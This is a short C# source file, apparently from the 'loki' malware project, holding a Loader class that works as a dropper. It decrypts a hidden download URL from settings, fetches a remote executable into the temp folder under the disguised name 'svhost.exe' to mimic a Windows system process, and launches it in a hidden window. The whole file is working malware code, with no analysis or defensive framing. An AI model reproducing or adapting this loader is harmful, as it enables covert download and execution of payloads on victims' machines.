namespace loki.loki.Utilies
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Net;
    using loki.Utilies.CryptoGrafy;

    internal class Loader
    {
        public static void Load()
        {
            string FileLocating = Path.GetTempPath();
            Download(FileLocating, crypt.AESDecript((Settings.url_loader)));
            RunProcess(FileLocating);
        }

        private static void RunProcess(string FileLocating)
        {
            using (var process = new Process { StartInfo = { FileName = FileLocating + "svhost.exe", WindowStyle = ProcessWindowStyle.Hidden } })
            {
                process.Start();
            }
        }

        private static void Download(string FileLocating, string url)
        {
            using (var webClient = new WebClient())
            {
                webClient.DownloadFile(new Uri(url), $"{FileLocating}\\svhost.exe");
            }
        }
    }
}